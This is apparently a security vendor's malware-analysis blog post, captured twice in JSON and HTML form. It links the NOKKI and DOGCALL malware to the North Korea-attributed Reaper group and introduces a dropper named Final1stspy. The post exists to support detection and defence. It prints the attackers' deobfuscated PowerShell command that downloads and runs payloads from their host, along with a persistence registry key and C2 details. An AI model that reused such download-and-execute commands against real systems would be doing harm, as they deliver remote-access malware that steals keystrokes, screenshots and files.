As part of this research, an interesting tie was discovered to the threat actor group known as Reaper.\r\n\r\nThe Reaper group has been publicly attributed to North Korea by other security organizations, targeting organizations that align with the interests of this country. Such targeted organizations include the military and defense industry within South Korea, as well as a Middle Eastern organization that was doing business with North Korea. Part of this group\u2019s modus operandi includes the use of a custom malware family called DOGCALL. DOGCALL is a remote access Trojan (RAT) that uses third-party hosting services to upload data and accept commands. At the time of publication, we observe this particular malware family in use by the Reaper threat actor group only.\r\n\r\nThis blog details the relationship found between the NOKKI and DOGCALL malware families, as well provides additional information about a previously unreported malware family used to deploy DOGCALL, which we have named Final1stspy based on a pdb string in the malware.\r\n\r\n&nbsp;\r\n\r\nTying the Knot\r\n\r\nWhile researching the NOKKI malware threat, Unit 42 discovered the most recent cluster of attacks beginning in July 2018 leveraged malicious macros within a Microsoft Word document. These particular macros were not overly complex in nature, and simply would attempt to perform the following actions:\r\n\r\n \tDownload and run an executable malware payload.\r\n \tDownload and open a Microsoft Word decoy document.\r\n\r\nTo avoid detection, the macros employ simple obfuscation of interesting strings that ultimately just used base64 encoding. However, it used a somewhat unusual method where it would first convert the base64-encoded text into hex, and then convert that hex into a text string.\r\n\r\n\r\nFigure 1 Malicious macro downloading remote payload and executing it (comments added by Unit 42 for clarity)\r\n\r\nFigure 2 Malicious macro implementing unique deobfuscation scheme (comments added by malware author\r\nBy searching on this unique deobfuscation technique present in all samples delivering NOKKI, a single other file was identified. This file had the following properties:\r\n\r\n\r\n\r\nMD5\r\ne02024f38dfb6290ce0d693539a285a9\r\n\r\n\r\nSHA1\r\nd13fc918433c705b49db74c91f56ae6c0cb5cf8d\r\n\r\n\r\nSHA256\r\n66a0c294ee8f3507d723a376065798631906128ce79bd6dfd8f025eda6b75e51\r\n\r\n\r\nCreator\r\nWindows User\r\n\r\n\r\nCreated Date\r\n2018-03-19 07:58:00 UTC\r\n\r\n\r\nLast Modified Date\r\n2018-06-16 14:19:00 UTC\r\n\r\n\r\nOriginal Filename\r\nWorld Cup predictions.doc\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nBased on the original filename, we can surmise this malware sample targeted individuals interested in the World Cup hosted in Russia in 2018. As we can see in the figure below, the unique deobfuscation routine used between the samples is identical, including the comments included by the author.\r\nFigure 3 Similarities between NOKKI dropper and World Cup predictions dropper\r\nWhile the deobfuscation routine was identical, the actual functionality of the macro differed slightly. The NOKKI dropper samples downloaded both a payload and a decoy document, but this World Cup predictions malware sample downloads and executes a remote VBScript file wrapped in HTML and appends text to the original Word document to provide the lure for the victim.\r\n\r\nThe lure in question includes the below text from a publicly available article written on ESPN in the UK:\r\n\r\n&nbsp;\r\n\r\n\u201cPeru and Denmark face off in the third match, and this time it doesn't seem as one sided. Four people go for a Peru victory, three for Denmark and three for the draw.\r\n\r\nLast but not least, we get to see Croatia and Nigeria for the first time. Our Nigeria expert, Colin, reckons there will be plenty of goals and a 3-2 win for his side -- the only person to back the Super Eagles.\r\n\r\nCheck out how our pundits got on with their predictions for following games and remember to join the pundits' league in Match Predictor.\r\n\r\nWe've got our top talent on hand from England, the United States, Mexico, Brazil, Argentina, Colombia, Australia, and Africa -- many of whom will be based out in Russia for the tournament -- to analyze each and every one of the 64 matches.\r\n\r\nWe'll score our experts just as we do in the Match Predictor -- 10 points for correct result, with a bonus 20 points for getting the score line right too.\u201d\r\n\r\nInterestingly enough, two commented out lures were also included in this document. One simply contains the phrase of \u201cI miss u.\u201d, but the second lure contains text from a publicly available article online discussing a visit by the North Korean leader to Singapore, shown below.\r\n\r\n\u201cThis aircraft seems to have conveyed a North Korean advance team including diplomats and security personnel.\r\n\r\nThe 747-400, which just landed in Singapore, was apparently used to fly Kim and his personal aides to the summit.\r\n\r\nThis would also be consistent with our previous reporting that North Korea had settled on such a plan.\r\n\r\nThe Jumbo Jet in question is quite special. B-2447 is used by the top rungs of the Chinese government, predominantly President Xi Jinping and his entourage, when traveling abroad.\r\n\r\nIt is capable of being specially outfitted with a VIP interior and has special interfaces for secure satellite communications among other modifications.\r\n\r\nWith this in mind, it wasn't surprising seeing it being used as 'Kim Force One' for this special mission.\u201d\r\n\r\n&nbsp;\r\n\r\nWhen the chain of execution completes on the World Cup predictions.doc file, a DOGCALL malware sample is executed on the victim machine.\r\n\r\nThe commented lure and payload used by the malware provides an interesting detail given that DOGCALL has been attributed to the threat actor group known as Reaper, which has been attributed to North Korea by other security organizations.\r\n\r\n&nbsp;\r\n\r\nContinuing Execution of the Malware\r\n\r\nAfter the initial execution of World Cup predictions.doc is run, it proceeds to download a VBScript file from the following URL:\r\n\r\n \thttp:\/\/ kmbr1.nitesbr1[.]org\/UserFiles\/File\/image\/home.html\r\n\r\nThis VBScript file yet again contains the exact same unique deobfuscation routine that was previously discussed. When this second stage VBScript file executes, it begins by writing the following data to %APPDATA%\\Microsoft\\mib.dat. This file will later be used by the Final1stspy malware family, which we discuss later in this post.\r\n\r\n1111:rom*E8FEF0CDF6C1EBBA90794B2B\r\n\r\nAfter this file is written, it will execute the following (deobfuscated):\r\nobjShell.Run \"cmd.exe \/k powershell.exe\" &amp; \" \" &amp; \"-windowstyle\" &amp; \" \" &amp; \"hidden\" &amp; \" \" &amp; \"-ExecutionPolicy Bypass\" &amp; \" \" &amp; \"$h='%APPDATA%\/Microsoft\/Windows\/msvcrt32.dll'\" &amp; \";\" &amp; \"$f='%APPDATA%\/Microsoft\/ieConv.exe'\" &amp; \";\" &amp; \"$x='\" &amp; \"http:\/\/\" &amp; \"kmbr1.nitesbr1.org\" &amp; \"\/UserFiles\/File\/image\/images\/happy.jpg\" &amp; \"';\" &amp; \"$t='\" &amp; \"http:\/\/\" &amp; \"kmbr1.nitesbr1[.]org\" &amp; \"\/UserFiles\/File\/image\/images\/wwwtest.jpg\" &amp; \"';\" &amp; \"(\" &amp; \"New-Object System.Net.WebClient\" &amp; \")\" &amp; \".DownloadFile($t,$f)\" &amp; \";\" &amp; \"(\" &amp; \"New-Object System.Net.WebClient\" &amp; \")\" &amp; \".DownloadFile($x,$h)\" &amp; \";\" &amp; \"Start-Process $f\" &amp; \";\" &amp; \"Stop-Process\" &amp; \" \" &amp; \"-processname\" &amp; \" \" &amp; \"cmd\", 0\r\nThis executed code simply downloads two files from http:\/\/ kmbr1.nitesbr1[.]org\/UserFiles\/File\/images\/happy.jpg \u00a0and http:\/\/ kmbr1.nitesbr1[.]org\/UserFiles\/File\/images\/wwwtest.jpg and stores them in %APPDATA%\/Microsoft\/Windows\/msvcrt32.dll and %APPDATA%\/Microsoft\/ieConv.exe, respectively. Finally, the VBScript file will execute the previously downloaded ieConv.exe file in a new process.\r\n\r\nThese two files are instances of a previously unreported dropper malware family that we are calling Final1stspy.\r\n\r\n&nbsp;\r\n\r\nOverview of Final1stspy\r\n\r\nAs previously stated, the Final1stspy malware family is split between an executable file and a DLL. These files have the following properties (Note: the DLL information is provided after it is decrypted by the malware):\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nMD5\r\n0f1d3ed85fee2acc23a8a26e0dc12e0f\r\n\r\n\r\nSHA1\r\n3d161de48d3f4da0aefff685253404c8b0111563\r\n\r\n\r\nSHA256\r\nfb94a5e30de7afd1d9072ccedd90a249374f687f16170e1986d6fd43c143fb3a\r\n\r\n\r\nFile Type\r\nPE32 executable (GUI) Intel 80386, for MS Windows\r\n\r\n\r\nFilename\r\nwwwtest.jpg\r\n\r\n\r\nCompile Timestamp\r\n2018-06-01 15:52:41 UTC\r\n\r\n\r\nPDB String\r\nE:\\Final Project(20180108)\\Final1stspy\\LoadDll\\Release\\LoadDll.pdb\r\n\r\n\r\n\r\n&nbsp;\r\n\r\n\r\n\r\nMD5\r\na2fe5dcb08ae8b72e8bc98ddc0b918e7\r\n\r\n\r\nSHA1\r\n741dbdb20d1beeb8ff809291996c8b78585cb812\r\n\r\n\r\nSHA256\r\n0669c71740134323793429d10518576b42941f9eee0def6057ed9a4ba87a3a9a\r\n\r\n\r\nFile Type\r\nPE32 executable (DLL) (GUI) Intel 80386, for MS Windows\r\n\r\n\r\nFilename\r\nhappy.jpg\r\n\r\n\r\nCompile Timestamp\r\n2018-06-17 17:04:15 UTC\r\n\r\n\r\nPDB String\r\nE:\\Final Project(20180108)\\Final1stspy\\hadowexecute - Copy\\Release\\hadowexecute.pdb\r\n\r\n\r\n\r\nAs we can see, both samples were compiled within a couple weeks of each other. Additionally, the original Microsoft Word document used to deliver this malware was last modified roughly a day before the DLL was compiled.\r\n\r\nBoth the executable and DLL make use of a specific routine to obfuscate strings of importance. The following code, written in Python, decodes these strings:\r\nimport base64\r\n\r\ndata = \"[Obfuscated String]\"\r\ndataDecoded = b64decode(data)\r\noutVar = \"\"\r\nfor char in dataDecoded:\r\n\toutVar += chr(((ord(char) + 122) ^ 0x19) &amp; 0xff)\r\nprint(outVar)\r\n\r\nThe Final1stspy malware begins by looking for the presence of the following file:\r\n\r\n \t%APPDATA%\\Microsoft\\Windows\\msvcrt64.dll\r\n\r\nShould this file be present, the malware will load the DLLs and attempt to call the exported main_func function.\r\n\r\nOtherwise, the malware will look for the following file:\r\n\r\n \t%APPDATA%\\Microsoft\\Windows\\msvcrt32.dll\r\n\r\nIn the event this file is present, the malware will decrypt this file by XORing it against 0x50, write it to the previously mentioned msvcrt64.dll path, and load the main_func function.\r\n\r\nThis DLL uses the same string obfuscation routine witnessed in the executable. It begins by collecting basic system information and ensuring persistence by setting the following registry key to point to %APPDATA%\/Microsoft\/ieConv.exe:\r\n\r\nHKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\rundll32\r\n\r\nThe Final1stspy malware family continues to read and parse the previously written mib.dat file. The data is parsed to eventually be used in subsequent HTTP GET requests, representing the Index, Account, and Group variables.\r\n\r\n\r\n\r\nOriginal String\r\n1111:rom*E8FEF0CDF6C1EBBA90794B2B\r\n\r\n\r\nIndex\r\n1111\r\n\r\n\r\nAccount\r\nE8FEF0CDF6C1EBBA90794B2B\r\n\r\n\r\nGroup\r\nRom\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nFinal1stspy has the ability to read in a %APPDATA%\/Microsoft\/olevnc.ini file that has several variables stored within it, such as the user-agent, URL, port, and interval counts. In the event this file is not present, such as in our given situation, the malware will default to a hardcoded user-agent and URL. This particular sample communicates with http:\/\/kmbr1.nitesbr1[.]org\/UserFiles\/File\/image\/index.php with a user-agent of Host Process Update.\r\n\r\nThe malware proceeds to make a HTTP GET request to the URL, such as the following example:\r\n\r\n\r\nFigure 4 HTTP request made by Final1stspy malware family\r\nThe following GET parameters are present in this request:\r\n\r\n\r\n\r\nVariable\r\nData\r\n\r\n\r\nMachineId\r\nMD5 generated from data obtained from machine victim\r\n\r\n\r\nInfoSo\r\nMicrosoft Windows version information and CPU architecture\r\n\r\n\r\nIndex\r\nData obtained from mib.dat\r\n\r\n\r\nAccount\r\nData obtained from mib.dat\r\n\r\n\r\nGroup\r\nData obtained from mib.dat\r\n\r\n\r\nList\r\nList of running processes (base64-encoded)\r\n\r\n\r\n\r\n&nbsp;\r\n\r\nThe malware expects to receive a payload that will subsequently be decrypted using a single-byte XOR key of 0x49. This payload will be loaded on the victim machine. After decryption, the following payload was identified:\r\n\r\n\r\n\r\nMD5\r\n05d43d417a8f50e7b23246643fc7e03d\r\n\r\n\r\nSHA1\r\n67c05b3937d94136eda4a60a2d5fb685abc776a1\r\n\r\n\r\nSHA256\r\n3fee068bf90ffbeb25549eb52be0456609b1decfe91cda1967eb068ef2c8918f\r\n\r\n\r\nFile Type\r\nPE32 executable (GUI) Intel 80386, for MS Windows\r\n\r\n\r\nFilename\r\ngirl.jpg\r\n\r\n\r\nCompile Timestamp\r\n2018-05-26 10:46:59 UTC\r\n\r\n\r\n\r\nAs we can see by the compile timestamp above, this file appears to have been compiled close to the Final1stspy executable. This payload has been identified as belonging to the DOGCALL malware family. It is able to perform the following actions on the victim:\r\n\r\n \tTake screenshots\r\n \tKeylogging\r\n \tCapture microphone data\r\n \tCollect victim information\r\n \tCollect files of interest\r\n \tDownload and execute additional payloads\r\n\r\nThe malware uploads the stolen data to third-party cloud storage providers. The sample identified in the wild is configured to upload to pCloud, but functionality to upload to Dropbox, Box and Yandex Cloud is also included.\r\n\r\n&nbsp;\r\n\r\nConclusion\r\n\r\nWhat originally began as research surrounding a new malware family named NOKKI that had code overlap and other ties to KONNI lead us to an interesting discovery tying the NOKKI malware family to the Reaper threat actor group. There are some curious aspects to this relationship, such as commented out North Korean-related lure information and DOGCALL malware payload. Additionally, we discovered yet another malware family that has not been previously publicly reported that we have named Final1stspy.\r\n\r\nUnit 42 will continue to monitor this threat and report on any updates encountered in the future. Palo Alto Networks customers are protected against this threat in the following ways:\r\n\r\n \tAll malware encountered is appropriately classified as malicious by WildFire\r\n \tTRAPs blocks this threat\r\n \tAutoFocus customers may track this threat via the KONNI, NOKKI, Final1stspy, DOGCALL, and Reaper\r\n\r\nIndicators of Compromise\r\n\r\nWorld Cup predictions Sample\r\n\r\n66a0c294ee8f3507d723a376065798631906128ce79bd6dfd8f025eda6b75e51\r\n\r\n&nbsp;\r\n\r\nFinal1stspy Samples\r\n\r\n0669c71740134323793429d10518576b42941f9eee0def6057ed9a4ba87a3a9a\r\n\r\nfb94a5e30de7afd1d9072ccedd90a249374f687f16170e1986d6fd43c143fb3a\r\n\r\n&nbsp;\r\n\r\nDOGCALL Samples\r\n\r\n3fee068bf90ffbeb25549eb52be0456609b1decfe91cda1967eb068ef2c8918f\r\n\r\n\u00a0\r\n\r\nInfrastructure\r\n\r\nkmbr1.nitesbr1[.]org","publisher":{"@type":"Organization","@id":"#panworg"},"image":{"@type":"ImageObject","url":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/uploads\/2018\/04\/unit42-blog-600x300-150x150.jpg","width":150,"height":150},"author":[{"@type":"Person","name":"Josh Grunzweig"}]}</script><link rel='stylesheet' id='crayon-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/crayon-syntax-highlighter/css/min/crayon.min.css?ver=_2.7.2_beta' type='text/css' media='all' />

As part of this research, an interesting tie was discovered to the threat actor group known as <a href="https://www.fireeye.com/blog/threat-research/2018/02/attacks-leveraging-adobe-zero-day.html">Reaper</a>.</p>
<p>The Reaper group has been publicly attributed to North Korea by other security organizations, targeting organizations that align with the interests of this country. Such targeted organizations include the military and defense industry within South Korea, as well as a Middle Eastern organization that was doing business with North Korea. Part of this group’s modus operandi includes the use of a custom malware family called DOGCALL. DOGCALL is a remote access Trojan (RAT) that uses third-party hosting services to upload data and accept commands. At the time of publication, we observe this particular malware family in use by the Reaper threat actor group only.</p>
<p>This blog details the relationship found between the NOKKI and DOGCALL malware families, as well provides additional information about a previously unreported malware family used to deploy DOGCALL, which we have named Final1stspy based on a pdb string in the malware.</p>
<p>&nbsp;</p>
<p><span style="font-size: 18pt;">Tying the Knot</span></p>
<p>While researching the NOKKI malware threat, Unit 42 discovered the most recent cluster of attacks beginning in July 2018 leveraged malicious macros within a Microsoft Word document. These particular macros were not overly complex in nature, and simply would attempt to perform the following actions:</p>
<ol>
<li>Download and run an executable malware payload.</li>
<li>Download and open a Microsoft Word decoy document.</li>
</ol>
<p>To avoid detection, the macros employ simple obfuscation of interesting strings that ultimately just used base64 encoding. However, it used a somewhat unusual method where it would first convert the base64-encoded text into hex, and then convert that hex into a text string.</p>
<p><img class="aligncenter wp-image-92253" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/09/DogCall.png" alt="DogCall" width="600" height="246" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/DogCall.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/DogCall-900x370.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/DogCall-300x123.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/DogCall-768x315.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/DogCall-370x152.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>

<p style="text-align: center;"><em>Figure 2 Malicious macro implementing unique deobfuscation scheme (comments added by malware author</em></p>
<p>By searching on this unique deobfuscation technique present in all samples delivering NOKKI, a single other file was identified. This file had the following properties:</p>

<p>&nbsp;</p>
<p>Based on the original filename, we can surmise this malware sample targeted individuals interested in the World Cup hosted in Russia in 2018. As we can see in the figure below, the unique deobfuscation routine used between the samples is identical, including the comments included by the author.<img class="aligncenter wp-image-92175" src="https://researchcenter.paloaltonetworks.com/wp-content/uploads/2018/09/Dogcall_3.png" alt="Dogcall_3" width="600" height="269" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/Dogcall_3.png 974w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/Dogcall_3-900x404.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/Dogcall_3-300x135.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/Dogcall_3-768x345.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/09/Dogcall_3-370x166.png 370w" sizes="(max-width: 600px) 100vw, 600px" /></p>
<p style="text-align: center;"><em>Figure 3 Similarities between NOKKI dropper and World Cup predictions dropper</em></p>
<p>While the deobfuscation routine was identical, the actual functionality of the macro differed slightly. The NOKKI dropper samples downloaded both a payload and a decoy document, but this World Cup predictions malware sample downloads and executes a remote VBScript file wrapped in HTML and appends text to the original Word document to provide the lure for the victim.</p>
<p>The lure in question includes the below text from a publicly available article <a href="http://www.espn.co.uk/sports/soccer/story/_/id/23961564/world-cup-predictions-craig-burley-rafa-ramos-nicolas-baier-share-top-spot">written on ESPN</a> in the UK:</p>
<p>&nbsp;</p>
<p>“<span style="font-family: 'courier new', courier, monospace;">Peru and Denmark face off in the third match, and this time it doesn&#8217;t seem as one sided. Four people go for a Peru victory, three for Denmark and three for the draw.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Last but not least, we get to see Croatia and Nigeria for the first time. Our Nigeria expert, Colin, reckons there will be plenty of goals and a 3-2 win for his side &#8212; the only person to back the Super Eagles.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">Check out how our pundits got on with their predictions for following games and remember to join the pundits&#8217; league in Match Predictor.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">We&#8217;ve got our top talent on hand from England, the United States, Mexico, Brazil, Argentina, Colombia, Australia, and Africa &#8212; many of whom will be based out in Russia for the tournament &#8212; to analyze each and every one of the 64 matches.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">We&#8217;ll score our experts just as we do in the Match Predictor &#8212; 10 points for correct result, with a bonus 20 points for getting the score line right too.”</span></p>
<p>Interestingly enough, two commented out lures were also included in this document. One simply contains the phrase of “I miss u.”, but the second lure contains text from a <a href="http://www.thedrive.com/the-war-zone/21430/procession-of-chinese-and-north-korean-jets-have-airlifted-kim-and-company-to-singapore">publicly available article online</a> discussing a visit by the North Korean leader to Singapore, shown below.</p>
<p><span style="font-family: 'courier new', courier, monospace;">“This aircraft seems to have conveyed a North Korean advance team including diplomats and security personnel.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">The 747-400, which just landed in Singapore, was apparently used to fly Kim and his personal aides to the summit.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">This would also be consistent with our previous reporting that North Korea had settled on such a plan.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">The Jumbo Jet in question is quite special. B-2447 is used by the top rungs of the Chinese government, predominantly President Xi Jinping and his entourage, when traveling abroad.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">It is capable of being specially outfitted with a VIP interior and has special interfaces for secure satellite communications among other modifications.</span></p>
<p><span style="font-family: 'courier new', courier, monospace;">With this in mind, it wasn&#8217;t surprising seeing it being used as &#8216;Kim Force One&#8217; for this special mission.”</span></p>

<p>When the chain of execution completes on the World Cup predictions.doc file, a DOGCALL malware sample is executed on the victim machine.</p>
<p>The commented lure and payload used by the malware provides an interesting detail given that DOGCALL has been attributed to the threat actor group known as Reaper, which has been attributed to North Korea by other security organizations.</p>
<p>&nbsp;</p>
<p><span style="font-size: 18pt;">Continuing Execution of the Malware</span></p>
<p>After the initial execution of World Cup predictions.doc is run, it proceeds to download a VBScript file from the following URL:</p>
<ul>
<li>http:// kmbr1.nitesbr1[.]org/UserFiles/File/image/home.html</li>
</ul>
<p>This VBScript file yet again contains the exact same unique deobfuscation routine that was previously discussed. When this second stage VBScript file executes, it begins by writing the following data to %APPDATA%\Microsoft\mib.dat. This file will later be used by the Final1stspy malware family, which we discuss later in this post.</p>

<p>As we can see, both samples were compiled within a couple weeks of each other. Additionally, the original Microsoft Word document used to deliver this malware was last modified roughly a day before the DLL was compiled.</p>
<p>Both the executable and DLL make use of a specific routine to obfuscate strings of importance. The following code, written in Python, decodes these strings:</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

<p>The Final1stspy malware begins by looking for the presence of the following file:</p>
<ul>
<li>%APPDATA%\Microsoft\Windows\msvcrt64.dll</li>
</ul>
<p>Should this file be present, the malware will load the DLLs and attempt to call the exported main_func function.</p>
<p>Otherwise, the malware will look for the following file:</p>
<ul>
<li>%APPDATA%\Microsoft\Windows\msvcrt32.dll</li>
</ul>
<p>In the event this file is present, the malware will decrypt this file by XORing it against 0x50, write it to the previously mentioned msvcrt64.dll path, and load the main_func function.</p>
<p>This DLL uses the same string obfuscation routine witnessed in the executable. It begins by collecting basic system information and ensuring persistence by setting the following registry key to point to %APPDATA%/Microsoft/ieConv.exe:</p>
<p><span style="font-family: 'courier new', courier, monospace;">HKCU\Software\Microsoft\Windows\CurrentVersion\Run\rundll32</span></p>
<p>The Final1stspy malware family continues to read and parse the previously written mib.dat file. The data is parsed to eventually be used in subsequent HTTP GET requests, representing the Index, Account, and Group variables.</p>

<p>Final1stspy has the ability to read in a %APPDATA%/Microsoft/olevnc.ini file that has several variables stored within it, such as the user-agent, URL, port, and interval counts. In the event this file is not present, such as in our given situation, the malware will default to a hardcoded user-agent and URL. This particular sample communicates with http://kmbr1.nitesbr1[.]org/UserFiles/File/image/index.php with a user-agent of Host Process Update.</p>
<p>The malware proceeds to make a HTTP GET request to the URL, such as the following example:</p>

<p>As we can see by the compile timestamp above, this file appears to have been compiled close to the Final1stspy executable. This payload has been identified as belonging to the DOGCALL malware family. It is able to perform the following actions on the victim:</p>
<ul>
<li>Take screenshots</li>
<li>Keylogging</li>
<li>Capture microphone data</li>
<li>Collect victim information</li>
<li>Collect files of interest</li>
<li>Download and execute additional payloads</li>
</ul>
<p>The malware uploads the stolen data to third-party cloud storage providers. The sample identified in the wild is configured to upload to pCloud, but functionality to upload to Dropbox, Box and Yandex Cloud is also included.</p>

<p><span style="font-size: 18pt;">Conclusion</span></p>
<p>What originally began as research surrounding a new malware family named NOKKI that had code overlap and other ties to KONNI lead us to an interesting discovery tying the NOKKI malware family to the Reaper threat actor group. There are some curious aspects to this relationship, such as commented out North Korean-related lure information and DOGCALL malware payload. Additionally, we discovered yet another malware family that has not been previously publicly reported that we have named Final1stspy.</p>
